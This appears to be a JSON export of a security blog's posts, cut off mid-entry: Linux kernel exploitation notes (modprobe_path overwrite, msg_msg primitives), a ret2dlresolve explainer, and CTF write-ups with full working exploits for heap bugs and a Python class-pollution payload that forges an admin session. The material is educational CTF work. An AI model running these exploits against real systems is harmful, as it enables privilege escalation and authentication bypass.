[{"content":"Modbprobe path When a binary with unknown magic bytes/shebang gets executed the kernel tries to load a module to handle that binary type.\nTo load this module it uses modprobe, whose path is stored in a kernel global variable called modprobe_path, which is RW (there are actually some mitigations for this).\nModprobe is executed as root using this path.\nIf we have an arbitrary write primitive we can trick the kernel into running our own binary/script as root.\nExploitation Write in modeprobe_path the path of your binary/script (this should be \u0026lt;path\u0026gt;/x).\nThen call this function to automate the rest:\nvoid modprobe(char* path){ int size = strlen(path) + 0x20; char flag_dest[size]; char flag[size]; char trigger[size]; char modprobe_sh_script[size]; snprintf(flag_dest, size, \u0026#34;%s/flag_dest\u0026#34;, path); snprintf(modprobe_sh_script, size, \u0026#34;%s/x\u0026#34;, path); snprintf(flag, size, \u0026#34;/flag\u0026#34;); snprintf(trigger, size, \u0026#34;%s/b\u0026#34;, path); const char format[102] = {\u0026#34;touch %s;\u0026#34; \u0026#34;echo -e \u0026#39;#!/bin/sh\\ncat %s \u0026gt; %s\u0026#39; \u0026gt; %s;\u0026#34; \u0026#34;echo -e \u0026#39;\\xff\\xff\\xff\\xff\u0026#39; \u0026gt; %s;\u0026#34; \u0026#34;chmod +x %s; chmod +x %s;\u0026#34; \u0026#34;%s;\u0026#34; \u0026#34;cat %s;\u0026#34; }; char cmd[sizeof(format) + size*9]; snprintf(cmd, sizeof(cmd), format, flag_dest, flag, flag_dest, modprobe_sh_script, trigger, modprobe_sh_script, trigger, trigger, flag_dest); system(cmd); } NOTE: path must be a directory writeable by your user\nThis function executed the following commands:\nWrites our sh script \u0026lt;path\u0026gt;/x the script cats the flag inside a file (\u0026lt;path\u0026gt;/flag_dest) readable by the unprivileged user Creates a \u0026ldquo;binary\u0026rdquo; with unknown magic bytes (0xffffffff) Makes our script and the \u0026ldquo;invalid binary\u0026rdquo; executable Executes the \u0026ldquo;invalid binary\u0026rdquo;, triggering the use of modprobe_path, which is set to our sh script (\u0026lt;path\u0026gt;/x). This executes our script with root privileges, the script in turn reads the flag and writes it to a readable location (\u0026lt;path\u0026gt;/flag_dest). Print the flag from \u0026lt;path\u0026gt;/flag_dest Useful links https://sam4k.com/like-techniques-modprobe_path/ ","permalink":"http://leo1.cc/posts/docs/modprobe/","summary":"modprobe_path is a global variable that in most kernels is RW. This variable is contains a path to an executable, do you see where this is going..?","title":"Kpwn tecniques: modprobe_path"},{"content":"struct msg_msg As I just started kernel exploitation I\u0026rsquo;ll cover the basics of this struct, but at the bottom there are other useful links for further exploitation. Maybe I\u0026rsquo;ll write a part 2 in the future.\nOverview msg_msg is a struct used by\nint msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg); and\nssize_t msgrcv(int msqid, void msgp, size_t msgsz, long msgtyp, int msgflg); These are syscalls responsible for sending and receiving messages to/from a queue identified by msqid.\nThis struct is composed as follows:\nstruct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct msg_msgseg *next; void *security; /* the actual message follows immediately */ }; So there are 0x30 bytes of metdata before the actual message.\nIf message size \u0026gt; 0x1000 - 0x30 the message gets splitted into different allocations. These allocations are linked in a linked list, using the next pointer. This pointer can be abused for kheap leak and arbitrary read.\nAs sizeof(struct msg_msg) = message length + 0x30 this struct can be allocated inside an arbitrary kmalloc cache, starting from kmalloc-64, up to kmalloc-4k.\nIf message size \u0026gt; 0xfd0 (0x1000-0x30) multiple allocations are made by the kernel, but only the first one contains all of the message metadata. The other allocations will have only 8 bytes of metadata, occupied by the next pointer of the linked list.\nstruct msg_msgseg { struct msg_msgseg *next; /* the next part of the message follows immediately */ }; Exploitation This struct is very versatile, thus it can be exploited in many different ways.\nThe basic ones are:\nArbitrary Read\nLeverage an UAF or OOB write to override the m_ts and next pointer. If m_ts \u0026gt; 0xfd0 it means that the message is segmented into multiple allocations, but as we control next we decide where the next segment of message is. Now calling msgrcv will get the kernel to read m_ts bytes of message from the various segments. As we control next we gained arbitrary read on kernel memory. Kheap leak \u0026amp; Uninitialized memory access\nAllocate a msg_msg using msgsnd Free it with msgrcv We can allocate over this memory and leverage uninitialized memory access to leak kheap from the message metadata This can be abused further in specific cases, I did that to solve empdb from BackdoorCTF 2023. In that case, using msg_msg was an easy way to obtain a free chunk containing arbitrary values (the message text). From there I could allocate an array of pointers over the freed msg_msg and, leveraging uninitialized memory access, I was able to gain arbitrary write. More on that here.\nUseful links \u0026amp; further exploitation https://syst3mfailure.io/wall-of-perdition/ https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html https://hardenedvault.net/blog/2022-11-13-msg_msg-recon-mitigation-ved/ https://linux.die.net/man/2/msgsnd ","permalink":"http://leo1.cc/posts/docs/msg_msg/","summary":"msg_msg is a really powerful and elastic kernel struct that can be abused to obtain strong primitives, such as arbitrary read/write/free.","title":"Kpwn tecniques: struct msg_msg"},{"content":"Download Challenge ↓\nOverview DidUP? Sounds more like DiDUP to me.\nDISCLAIMER: for evil professors only!\nnc localhost 1337\nP.S: The real DidUP is out of scope, if you manage to pwn that please pay my school fees :)\nThe challenge file is a single C binary compiled with all protections.\nReversing the binary we can identify 4 main functionalities:\nadd_mark: allows the user to allocate a chunk (adding it to a list) and write a mark (int) and a description (string) into it remove_mark: frees the chunk containing the mark and removes it from the list change_mark: change the data inside a previosly allocated chunk save_mark: spawns a thread and makes a post request to an arbitrary endpoint, sending the mark as payload. It also removes the chunk. Solution Race condition The function save_mark seems suspicious because the call to free is made before the post request, but the pointer is removed from the list after it. This can trigger a race condition that can lead to a double free!\nAs we can choose the url for the request, the race condition can have an arbitrary window, we just need to setup an endpoint with a sleep.\n\u0026lt;?php if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $body = file_get_contents(\u0026#39;php://input\u0026#39;); $logFile = \u0026#39;bodies.txt\u0026#39;; file_put_contents($logFile, $body . PHP_EOL, FILE_APPEND); // stores the body of the request sleep(3); // just wait (arb window) } else { echo \u0026#34;Make a POST request\u0026#34;; } ?\u0026gt; this is the simple endpoint I made. Please webbers, have mercy\nLeak heap Saving a file two times in a row allows us to leak the heap.\nThis can be done because, after the first free, the saved mark becomes the \u0026ldquo;safe-linked\u0026rdquo; chunk-\u0026gt;fd and if the chunk is the last in the linked list then chunk-\u0026gt;fd = heap\u0026gt;\u0026gt;12. We just need to guess the upper nibble of the heap, which is usually 0x5 or 0x6.\nIn short:\nadd chunk save chunk (start race) change chunk tcache-key sleep for 1 sec (ensure requests arrive in the right order) save chunk again (leak heap) sleep for 2 sec (end race) Note that we need to change the tcache-key (second qword of the chunk) before saving the chunk a second time, otherwise we get a SIGABRT.\nAnd now let\u0026rsquo;s have some fun with feng shui!\nPartial libc leak With some allocations we can get a chunk into unsortedbins and leak the lower 4 bytes of libc using save_mark.\nPlaying with tcache_perthread_struct At this point the easiest way of arbitrary writing is to tamper with the tcache_perthread_struct, as we avoid messing with safe linking, but as we don\u0026rsquo;t have a full libc leak we need to do some magic.\nThe idea is to free a chunk into unsortedbins so as to have a pointer to main_arena as the first entry in the 0x40 tcache linked list.\nTo achieve this we need to move to smallbins the unsortedbin that we used to partial-leak libc, otherwise freeing another big chunk won\u0026rsquo;t give us a pointer to libc. To do this we need to allocate a bunch of chunks.\nLibc-leak method 1: stdout as read primitive Once we have our pointer to main_arena as the first entry in 0x40 tcache we can partial override and make it an _IO_2_1_stdout_\u0026rsquo;s pointer. Now we can allocate a chunk over stdout and partial override _IO_write_base to dump some bytes and fully leak libc (note that buffering is disabled for sdtout, so the buffer pointers in the file struct point inside the struct itself).\\\nThis tecnique is well explained by nobodyisnobody on his github.\nLibc-leak method 2: abuse safe-linking Another way of leaking libc consists in partial overriding the main_arena\u0026rsquo;s pointer to make it point to a writable NULL region of libc.\nAllocating that chunk would trigger safe-linking (if the number of chunks in the 0x40 tcache is greater than 0).\nWe are now in the same situation as when we leaked the heap: we can use the save_mark functionality to leak libc\u0026gt;\u0026gt;12 and guess the upper nibble (0x7).\nSpawning a shell Once we have leaked libc there are different paths one can take:\nleak environ overriding _IO_2_1_stdout_ a second time and then build a ROP chain on the stack of the add_mark function\nAngry-FSROP on stdout\nlibc GOT override using a onegadget (not tested)\nlibc GOT override to stack pivot and ROP (basically this tecnique)\nExploit #!/usr/bin/env python3 from pwn import * import time import requests exe = ELF(\u0026#34;./build/didup_patched\u0026#34;) # patched libc = ELF(\u0026#34;./libs/libc.so.6\u0026#34;) context.binary = exe WEBHOOK = \u0026#34;http://your.webhook\u0026#34;.encode() gdbscript = \\ \u0026#34;\u0026#34;\u0026#34; set follow-fork-mode parent set resolve-heap-via-heuristic force \u0026#34;\u0026#34;\u0026#34; def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript) elif args.REMOTE: r = remote(\u0026#34;localhost\u0026#34;, 1337) else: r = process([exe.path]) return r r = conn() def add(idx, mark, desc): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\u0026#34;:\u0026#34;, mark) else: r.sendlineafter(b\u0026#34;:\u0026#34;, str(mark).encode()) if desc != b\u0026#34;\u0026#34;: r.sendafter(b\u0026#34;:\u0026#34;, desc) def remove(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) def save(idx, url): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) r.sendlineafter(b\u0026#34;:\u0026#34;, url) def change(idx, mark, desc): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\u0026#34;:\u0026#34;, mark) else: r.sendlineafter(b\u0026#34;:\u0026#34;, str(mark).encode()) if desc != b\u0026#34;\u0026#34;: r.sendafter(b\u0026#34;:\u0026#34;, desc) # given a pointer generate mark and description def gen_mark_desc(ptr): mark = ptr \u0026amp; 0xffffffff desc = p32((ptr \u0026amp; (0xffff\u0026lt;\u0026lt;32)) \u0026gt;\u0026gt; 32) return mark, desc # calculate safe-linked pointer def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def main(): if args.REMOTE: print(r.recvuntil(b\u0026#34;Result\u0026#34;)) r.sendlineafter(b\u0026#34;:\u0026#34;, input(\u0026#34;Result: \u0026#34;).encode()) # race condition to tcache-dup \u0026amp; leak heap add(0, 1, b\u0026#34;\u0026#34;) # -- start race -- save(0, WEBHOOK) # change tcache-key (use \u0026#34;-\u0026#34; to keep chunk-\u0026gt;fd untouched) change(0, b\u0026#34;-\u0026#34;, b\u0026#34;asdasdasdasdasd\u0026#34;) time.sleep(1) # ensure requests arrive in the right order save(0, WEBHOOK) # leak heap time.sleep(2) # -- end race -- # -- guess upper 4 bits of heap -- leak = int(requests.get(WEBHOOK.decode()+\u0026#34;bodies.txt\u0026#34;).text.split(\u0026#34;\\n\u0026#34;)[-2].split(\u0026#34;mark=\u0026#34;)[1]) heap = 0 if leak \u0026lt; 0: heap = (0x100000000 + leak) else: heap = leak heap = heap \u0026lt;\u0026lt; 12 # log.info(f\u0026#34;partial heap: {hex(heap)}\u0026#34;) # h_nibble = int(input(\u0026#34;Guess the upper nibble: 0x\u0026#34;).rjust(2, \u0026#34;0\u0026#34;), 16) # usually 0x55 \u0026lt;= (heap\u0026gt;\u0026gt;40) \u0026lt;= 0x65 if (heap\u0026gt;\u0026gt;40) \u0026gt; 5: h_nibble = 5 else: h_nibble = 6 heap = (h_nibble\u0026lt;\u0026lt;44) + heap log.warning(f\u0026#34;heap: {hex(heap)}\u0026#34;) # ------------------------------- # undo tcache dup add(0, 1, b\u0026#34;\u0026#34;) add(0, 1, b\u0026#34;\u0026#34;) # ====================================================== # create a big chunk and put it in unsortedbins # allocate from it a chunk # doing so we can partially leak libc without corrupting unsortedbins # then we need to consume the unsortedbin # in this way the thread can\u0026#39;t allocate from it (avoid heap mess and crash) # increase tcache count for i in range(2, 10): add(i, 1, b\u0026#34;\u0026#34;) for i in range(6, 10): remove(i) # race to tcache-dup add(4, 1, b\u0026#34;\u0026#34;) save(4, WEBHOOK) change(4, 6, b\u0026#34;asdasdasd\u0026#34;) remove(4) time.sleep(4) # allocate a chunk above tcache_perthread_struct # this will be used to enlarge the chunk under it add(4, 1, b\u0026#34;\u0026#34;) tcache_metadata = calculate_P1(heap+0x80, heap+0x6c0) mark, desc = gen_mark_desc(tcache_metadata) change(4, mark, desc) add(4, 1, b\u0026#34;\u0026#34;) # allocate a chunk and one above it to change its size payload = p32(0) + p64(0)*3 + p64(heap+0x430) add(4, 6, payload) # chunk above tcache_perthread_struct add(8, 1, b\u0026#34;\u0026#34;) # small chunk to overlap and enlarge the one under it payload = p32(0) + p64(0)*3 + p64(heap+0x410) change(4, 6, payload) # enlarge payload = p32(0) + p64(0)*2 + p64(0x441) add(9, 6, payload) # put big chunk in unsortedbins remove(8) # add chunk from the one in unsortedbins (now we have 2 chunks pointing to libc) add(0, 1, b\u0026#34;\u0026#34;) # we can save (free) one of them to leak 4 bytes of libc save(0, WEBHOOK) time.sleep(4) leak = int(requests.get(WEBHOOK.decode()+\u0026#34;bodies.txt\u0026#34;).text.split(\u0026#34;\\n\u0026#34;)[-2].split(\u0026#34;mark=\u0026#34;)[1]) partial_libc = 0 if leak \u0026lt; 0: partial_libc = (0x100000000 + leak) else: partial_libc = leak log.warning(f\u0026#34;partial libc: {hex(partial_libc)}\u0026#34;) # -- consume unsortedbin -- for _ in range(10): add(0, 1, b\u0026#34;\u0026#34;) for i in range(3): add(i, 1, b\u0026#34;\u0026#34;) # add entries to 0x40 tcache for i in range(3): remove(i) # ------------------------- # ====================================================== # create a big chunk over tcache_perthread_struct # and put it in unsorted bin # now we have a libc pointer as first entry in 0x40 tcache # then partial override that ptr to make it point to stdout # allocate a chunk precisely over 0x40 tcache entry in tcache_perthread_struct # it\u0026#39;s size will be changed by the chunk above payload = p32(0) + p64(0)*3 + p64(heap+0xa0) change(4, 6, payload) add(2, 1, b\u0026#34;\u0026#34;) # enlarge change(4, 6, p32(0)+flat(0,0,0x4f1)) # free it (to unsortedbins) # to have a libc ptr as first entry on 0x40 tcache remove(2) # calulate partial stdout from leaked libc bytes partial_stdout = (partial_libc \u0026amp; 0xfffff000) + 0x780 # partial override libc address to allocate over stdout payload = p32(0)+flat(0,0,0x4b1)+p32(partial_stdout) change(4, 6, payload) # ====================================================== add(5, 1, b\u0026#34;\u0026#34;) # chunk over stdout # partial override _IO_write_base to leak libc mark = 0xfbad1887 desc = p32(0) + p64(0)*3 + p32(partial_stdout-0x100) change(5, mark, desc) r.recv() libc.address = u64(r.recv(8)) - 0x21a6a0 log.warning(f\u0026#34;libc: {hex(libc.address)}\u0026#34;) # ====================================================== # leak environ abusing stdout as read primitive mark = 0xfbad1887 # _IO_write_base = _IO_read_end = environ # _IO_write_ptr = environ+0x100 desc = p32(0) + p64(0) + p64(libc.sym.environ) + p64(0) + p64(libc.sym.environ) + p64(libc.sym.environ+0x100) change(5, mark, desc) r.recv() stack = u64(r.recv(8)) - 0x148 log.warning(f\u0026#34;stack: {hex(stack)}\u0026#34;) # ====================================================== # change tcache metadata to allocate over retaddr of add_mark function # then write a ret2libc on the stack # change tcache_perthread_struct using previously allocated chunk payload = p32(0)+flat(0,0,0x511)+p64(stack) change(4, 6, payload) # ret2libc on the stack POP_RDI_RET = libc.address + 0x2a3e5 RET = libc.address + 0xf41c9 BINSH = libc.address + 0x1d8698 ret2libc = p32(0) + flat(POP_RDI_RET, BINSH, RET, libc.sym.system) add(0, 6, ret2libc) # ====================================================== log.success(f\u0026#34;pwned :)\u0026#34;) r.sendline(b\u0026#34;cat flag\u0026#34;) r.recv() flag = r.recvline().decode().rstrip(\u0026#34;\\n\u0026#34;) print(flag) # r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"http://leo1.cc/posts/writeups/cte24-didup/","summary":"This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.","title":"CTE24 - DiDUP"},{"content":"BINARY OVERVIEW Pwnymalloc is a custom heap implementation library, the mechanics resemble the actual heap behaviors, but the code is really simple and short, so it must be pwnable!\nWe are also provided with a binary that implements a \u0026ldquo;customer service portal\u0026rdquo; using Pwnymalloc library.\nBINARY REVERSE ENGINEERING The binary allows a user to:\nSubmit a complaint: allocate a chunk, write into it and free it (basically throws our opinion away, thank you!) Request a refund: allocate a chunk and write into it (this chunk has a REFUND_APPROVED bit set to 0, and we cannot change it) Check refund status: prints the flag if a refund gets somehow approved (REFUND_APPROVED == 1) Our goal should be to break Pwnymalloc to somehow override the REFUND_APPROVED bit and get the flag, so let\u0026rsquo;s read the library\u0026rsquo;s source code.\nLIBRARY REVERSE ENGINEERING My first hope was to be able to find the vulnerability without having to reverse all the code, which was not so short after all. But, guess what\u0026hellip; I ended up reading and trying to understand the whole code :/\nThis took quite a bit of time, but being familiar with the glibc heap implementation it\u0026rsquo;s easy to guess what these functions are doing.\nReading through the code we can identify the 2 most important functions:\npwnymalloc(size):\nInitializes the heap if it’s the first allocation. Aligns the requested size and searches for a fitting block. If no suitable block is found, it extends the heap. Optionally splits larger blocks to minimize waste. Returns a pointer to the allocated memory. pwnyfree(ptr):\nValidates the pointer and its alignment. Marks the block as free and attempts to coalesce it with adjacent free blocks. Inserts the coalesced block back into the free list. A thing that caught my attention here was the \u0026ldquo;coalescence\u0026rdquo; feature: it sounded sketchy (and that turned out to be a really lucky guess).\nstatic chunk_ptr coalesce(chunk_ptr block) { chunk_ptr prev_block = prev_chunk(block); chunk_ptr next_block = next_chunk(block); size_t size = get_size(block); int prev_status = prev_block == NULL ? -1 : get_status(prev_block); int next_status = next_block == NULL ? -1 : get_status(next_block); if (prev_status == FREE \u0026amp;\u0026amp; next_status == FREE) { // ... } The functions starts by getting the pointers to the previous and next chunk, but how is it done?\nstatic chunk_ptr prev_chunk(chunk_ptr block) { if ((void *) block - get_prev_size(block) \u0026lt; heap_start || get_prev_size(block) == 0) { return NULL; } return (chunk_ptr) ((char *) block - get_prev_size(block)); } static size_t get_prev_size(chunk_ptr block) { btag_t *prev_footer = (btag_t *) ((char *) block - BTAG_SIZE); return prev_footer-\u0026gt;size; } Okay, so the btag is the size of a free chunk and it is located in the last WORD of it. Apparently this is used to calculate the pointer to the previous chunk during backward consolidation coalescence, but wait a moment, there is no check to confirm that the previous chunk is free!\nWe could basically allocate a chunk and write a fake btag in its last WORD, in this way if coalesce is triggered on the chunk after it prev_chunk would calcolate and return an arbitrary pointer!\nEXPLOITATION At this point the exploitation path was really clear to me:\nAllocate a chunk containing a fake chunk (it\u0026rsquo;s pointer will be calculated by prev_chunk using a fake btag). Allocate another chunk and place a forged btag in its last WORD, calculating the right offset from the fake chunk. Allocate a chunk and free it to trigger the coalesce mechanism and get the fake chunk into the \u0026ldquo;bin\u0026rdquo;. Finally allocate the fake chunk and override the REFUND_APPROVED bit and get the flag! Problems I faced Obviously the exploit didn\u0026rsquo;t work first try, the main problems I faced are the following:\nthe fake chunk must be aligned at 16 bytes, the fake chunk\u0026rsquo;s fd and bk (pointers to next and previous free chunks) must be set to 0 to avoid further pain, the fake chunk must be set to FREE so the metadata must be calculated with the following formula: size | status. Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;./chal\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=\u0026#34;b *pwnymalloc+210\u0026#34;) elif args.REMOTE: r = remote(\u0026#34;pwnymalloc.chal.uiuc.tf\u0026#34;, 1337, ssl=True) else: r = process([exe.path]) return r r = conn() def refund(amount, payload): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(amount).encode()) r.sendafter(b\u0026#34;:\u0026#34;, payload) def complaint(text): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, text.encode()) def main(): progress = log.progress(\u0026#34;cooking\u0026#34;) # build fake chunk fake_chunk_metadata = flat(0, 0xa0) payload = b\u0026#34;a\u0026#34;*0x28 + fake_chunk_metadata + b\u0026#34;\\x00\u0026#34;*71 refund(12, payload) # allocate a chunk with a forged btag btag = 0xe0 payload = b\u0026#34;\\x00\u0026#34;*0x78 + p32(btag) + b\u0026#34;\\x00\u0026#34;*3 refund(12, payload) # allocate and free complaint(\u0026#34;hello\u0026#34;) # override REFUND_APPROVED bit of complaint REFUND_APPROVED = 1 payload = b\u0026#34;a\u0026#34;*0x40 + p64(0x91) + p32(REFUND_APPROVED) + p32(12) + b\u0026#34;\\x00\u0026#34;*0x2f refund(12, payload) # check status to get the flag! r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, b\u0026#34;1\u0026#34;) progress.success() r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: uiuctf{the_memory_train_went_off_the_tracks}\nPost Scriptum I realized that if the first thing you do after running the binary is submitting a complaint the program would SIGSEGV. That\u0026rsquo;s because pwnyfree always calls coalesce and in turn coalesce tries to get the previous chunk\u0026rsquo;s btag. The thing is that the complaint is the first heap allocation, there is no previous chunk, so the program tries to get the contents of the WORD right before the start of the heap (which is not in mapped memory).\nI learned a really good lesson here: always try the binary before reading the code!\n","permalink":"http://leo1.cc/posts/writeups/uiuctf24-pwnymalloc/","summary":"Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.","title":"UIUCTF24 - Pwnymalloc"},{"content":"Overview Use a the function _dl_runtime_resolve_xsavec ( link_map , reloc_arg ) to relocate an arbitrary symbol (e.g. system) and call that function.\nStructures There are 3 struct that handle the relocation process: JMPREL, STRTAB, DYNSYM.\nJMPREL (.rela.plt) This stores a relocation table\nLOAD:04005C0 ; ELF JMPREL Relocation Table LOAD:04005C0 Elf64_Rela \u0026lt;404018h, 200000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT write LOAD:04005D8 Elf64_Rela \u0026lt;404020h, 300000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT strlen LOAD:04005F0 Elf64_Rela \u0026lt;404028h, 400000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT setbuf LOAD:0400608 Elf64_Rela \u0026lt;404030h, 500000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT read example of relocation table\nThe type of these entries is Elf64_Rela, which is defined as follows. The size of one entry is 24 bytes.\ntypedef struct { Elf64_Addr r_offset; /* 64 bit - Address */ Elf64_Xword r_info; /* 64 bit - Relocation type and symbol index */ Elf64_Sxword r_addend; /* 64 bit - Addend */ } Elf64_Rela; // 24 bytes /* How to extract and insert information held in the r_info field.*/ #define ELF64_R_SYM(i) ((i) \u0026gt;\u0026gt; 32) #define ELF64_R_TYPE(i) ((i) \u0026amp; 0xffffffff) #define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) \u0026lt;\u0026lt; 32) + (type)) ELF64_R_SYM(r_info) gives the index of the Elf64_Sym in DYNSYM for the specified symbol. ELF64_R_TYPE(r_info) must be equal to 7. DYNSYM (.dynsym) LOAD:04003D8 ; ELF Symbol Table LOAD:04003D8 Elf64_Sym \u0026lt;0\u0026gt; LOAD:04003F0 Elf64_Sym \u0026lt;offset aLibcStartMain - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; LOAD:0400408 Elf64_Sym \u0026lt;offset aWrite - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;write\u0026#34; LOAD:0400420 Elf64_Sym \u0026lt;offset aStrlen - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;strlen\u0026#34; LOAD:0400438 Elf64_Sym \u0026lt;offset aSetbuf - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;setbuf\u0026#34; LOAD:0400450 Elf64_Sym \u0026lt;offset aRead - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; example of symbol table\nThis table holds relevant symbol information. Each entry is a Elf32_Sym structure and its size is 24 bytes.\ntypedef struct { Elf64_Word st_name; /* 32bit - Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* 16 bits - Section index */ Elf64_Addr st_value; /* 64 bits - Symbol value */ Elf64_Xword st_size; /* 64 bits - Symbol size */ } Elf64_Sym; // 24 bytes Only st_name is important for the exploit.\nSTRTAB (.dynstr) STRTAB is a simple table that stores the strings for symbols name.\n0x804822c:\t\u0026#34;\u0026#34; 0x804822d:\t\u0026#34;libc.so.6\u0026#34; 0x8048237:\t\u0026#34;_IO_stdin_used\u0026#34; 0x8048246:\t\u0026#34;read\u0026#34; 0x804824b:\t\u0026#34;alarm\u0026#34; 0x8048251:\t\u0026#34;__libc_start_main\u0026#34; 0x8048263:\t\u0026#34;__gmon_start__\u0026#34; 0x8048272:\t\u0026#34;GLIBC_2.0\u0026#34; example of STRTAB\nSummary of GDB commands Get JMPREL:\ngef➤ x/3xg (JMPREL) + (reloc_arg) * 24\nsymbol_number = r_info \u0026raquo; 32\ntype = r_info \u0026amp; 0xffffffff\nGet SYMTAB:\ngef➤ x/3xg (SYMTAB) + (symbol_number) * 24\nGet STRTAB:\ngef➤ x/s (STRTAB) + (st_name)\nRelocation summary A typical relocation goes as follows:\nCall _dl_runtime_resolve_xsavec ( link_map , reloc_arg ) where link_map is a list with all the loaded libraries and reloc_arg is the offset of the Elf64_Rela entry in JMPREL Knowing the address of the Elf36_Rela for the specified symbol get r_info Get R_SYM with `r_info \u0026raquo; 32 (ELF64_R_SYM macro) Get st_name from the Elf64_Sym entry with DYNSYM + R_SYM*24 Get the symbol with STRTAB + st_name Search for that symbol in link_map and then write its address to the correct GOT entry using r_offset from Elf64_Rela Finally call the relocated function EXPLOIT Forge Elf64_Rela so that DYNSYM + (r_info\u0026gt;\u0026gt;8)*24 points to a forged Elf64_Sym Forge Elf64_Sym so that st_name points to \u0026quot;system\u0026quot; Call _dl_runtime_resolve ( link_map , rel_offset ) ","permalink":"http://leo1.cc/posts/docs/ret2dlresolve/","summary":"Ret2dlresolve is a really powerful tecnique to use in pwn challenges (even tho it\u0026rsquo;s not frequently seen). It\u0026rsquo;s useful when we don\u0026rsquo;t have libc leaks or don\u0026rsquo;t know the libc version.","title":"Ret2dlresolve in 64bit binaries"},{"content":"CHALLENGE OVERVIEW Othernote is a basic note taking website that has the options to create and edit notes for a logged user. The backend is written in python. The main endpoints are:\n/login where a user can login with his credentials /signup where you can create your credentials for login /notes to display all the notes of a logged user /notes/create to create a new note /notes/\u0026lt;string:note_id\u0026gt;/update to update a note based on its note_id /admin which can only be accessed by admin user and contains the flag VULNERABILITIES The function responsible of retrieving the notes for a user is vulnerable to path traversals:\ndef load_user_notes(username): user_notes_file = os.path.join(\u0026#34;user_notes\u0026#34;, f\u0026#34;{username}.json\u0026#34;) if os.path.exists(user_notes_file): with open(user_notes_file, \u0026#39;r\u0026#39;) as file: data = json.load(file) return {k: Note(v) for k, v in data.items()} As you can see the username is used to get the json file containing the user\u0026rsquo;s notes. So a username like ./admin can make us read admin\u0026rsquo;s notes. Unfortunately this is not useful at all.\nAnother sus function in my opinion was merge:\ndef merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) It is used to merge two json dictionaries together and it is called when we update a note.\nThis function made me think of prototype pollution, but as I never exploited this vulnerability on a python backend I searched if it would be possible, and sure it was! I found this article on Hacktricks and basically copy-pasted the payload.\nEXPLOITATION The exploitation phase went as follows:\ncreate an account and log in create a note update note making a PUT request with the following body {\u0026#34;__class__\u0026#34;:{\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;session\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}}}}} this pollutes the session dict, making us admin\nthe server responds with a new session cookie using that cookie we can GET /admin to get the flag FLAG: codegate2024{78a5e12a3f3cdff9dfd8fc62215312abad910c78296d57003e5bf8b842b740aeb750eed0bfb54ddd30194baecfb5f2ebccd9be7bb4efa9}\n","permalink":"http://leo1.cc/posts/writeups/codegatejunior24-othernote/","summary":"Simple web challenge about prototype pollution in python. It was part of the Codegate quals for juniors of 2024 (I made the writeup only because it was required to move to the finals).","title":"CodegateJunior24 - Othernote"},{"content":"BINARY OVERVIEW Baby Heap is a simple heap based 64 bit binary, when executed it gives the user 5 options:\nadd (create a chunk of a specified size and initialize it with the provided data) free (free a chunk) modify (modify the data of a chunk (max 40 bytes)) view (print the data contained in a chunk) exit (return from main) REVERSE ENGINEERING After trying every feature of the binary I opened it up in Ida (which usually gives the best 